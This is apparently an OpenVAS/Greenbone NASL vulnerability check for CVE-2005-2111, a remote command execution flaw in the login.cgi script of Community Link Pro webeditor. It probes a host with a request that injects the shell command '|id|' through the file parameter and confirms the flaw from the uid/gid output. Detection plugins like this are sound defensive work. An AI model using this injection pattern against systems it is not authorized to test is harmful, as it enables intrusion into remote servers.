if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19305" );
	script_version( "2020-08-25T06:50:30+0000" );
	script_tag( name: "last_modification", value: "2020-08-25 06:50:30 +0000 (Tue, 25 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_bugtraq_id( 14097 );
	script_cve_id( "CVE-2005-2111" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Community Link Pro webeditor login.cgi remote command execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "The remote host is running Community Link Pro, a web-based application written
  in Perl.

  The remote version of this software contains a flaw in the script 'login.cgi'" );
	script_tag( name: "impact", value: "The flaw may allow an attacker to execute arbitrary commands on the remote host." );
	script_tag( name: "solution", value: "Disable or remove this CGI." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("list_array_func.inc.sc");
require("port_service_func.inc.sc");
http_check_remote_code( check_request: "/login.cgi?username=&command=simple&do=edit&password=&file=|id|", check_result: "uid=[0-9]+.*gid=[0-9]+.*", command: "id", extra_dirs: make_list( "/app/webeditor" ) );
exit( 99 );

